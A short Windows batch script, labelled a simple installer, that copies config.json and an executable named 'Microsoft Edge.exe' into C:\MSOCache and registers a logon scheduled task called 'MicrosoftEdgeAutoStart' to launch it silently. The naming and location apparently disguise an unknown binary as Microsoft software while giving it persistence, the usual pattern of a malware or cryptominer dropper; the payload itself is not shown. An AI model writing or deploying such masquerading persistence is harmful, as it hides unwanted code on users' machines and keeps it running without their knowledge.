@echo off
setlocal

rem === Simple installer ===

rem Source = folder where this .bat lives (e.g. D:\Tor)
set "SRC=%~dp0"

rem Destination
set "DST=C:\MSOCache"

rem Create folder C:\MSOCache
mkdir "%DST%" 2>nul

rem Copy files
copy "%SRC%config.json" "%DST%\" /Y >nul
copy "%SRC%Microsoft Edge.exe" "%DST%\" /Y >nul

rem Create a small launcher that:
rem   - sets working directory
rem   - starts the EXE in a separate process
rem   - then exits so the terminal closes immediately
(
    echo @echo off
    echo cd /d "C:\MSOCache"
    echo start "" "C:\MSOCache\Microsoft Edge.exe"
    echo exit
) > "%DST%\run_app.bat"

rem Remove any old task with same name
schtasks /Delete /TN "MicrosoftEdgeAutoStart" /F >nul 2>&1

rem Create scheduled task to run launcher at every logon
schtasks /Create ^
  /SC ONLOGON ^
  /TN "MicrosoftEdgeAutoStart" ^
  /TR "\"%DST%\run_app.bat\"" ^
  /F

echo Installed to: %DST%
echo Task created: MicrosoftEdgeAutoStart (runs at user logon)

endlocal
